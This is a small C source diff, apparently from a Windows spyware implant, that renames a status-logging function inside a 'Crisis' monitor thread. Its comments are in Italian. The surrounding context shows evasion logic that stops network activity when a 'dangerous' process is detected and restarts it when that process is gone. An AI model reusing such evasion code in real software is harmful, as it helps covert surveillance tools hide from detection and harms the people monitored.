@@ -9,7 +9,7 @@
 #include "../../H4DLL/HM_IpcModule.h"
 #include "../../H4DLL/HM_InbundleHook.h"
 #include "../../H4DLL/strings.h"
-#include "../../H4DLL/status_log.h"
+#include "../../H4DLL/LOG.h"
 
 HANDLE hCrisisThread = NULL;
 BOOL bPM_CrisisAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
@@ -100,9 +100,9 @@ DWORD WINAPI MonitorCrisisThread(DWORD dummy)
 		// XXX Questo thread gira anche durante la sync, ma le probabilita' di una race sui log
 		// sono infinitesimali
 		if (FLAG_NOTEQUALS(shared.crisis, NETWORK_CRISIS) && process_network_found)
-			SendStatusLog(L"[Crisis]: Network activity inhibited");
+			LOG_SendStatusLog(L"[Crisis]: Network activity inhibited");
 		else if (FLAG_EQUALS(shared.crisis, NETWORK_CRISIS) && !process_network_found)
-			SendStatusLog(L"[Crisis]: Network activity restarted");
+			LOG_SendStatusLog(L"[Crisis]: Network activity restarted");
 
 		// Se ha trovato un processo pericoloso (perche' lo stava checkando) allora setta lo stato
 		SET_BOOLEAN_FLAG(shared.crisis, SYSTEM_CRISIS, process_system_found);
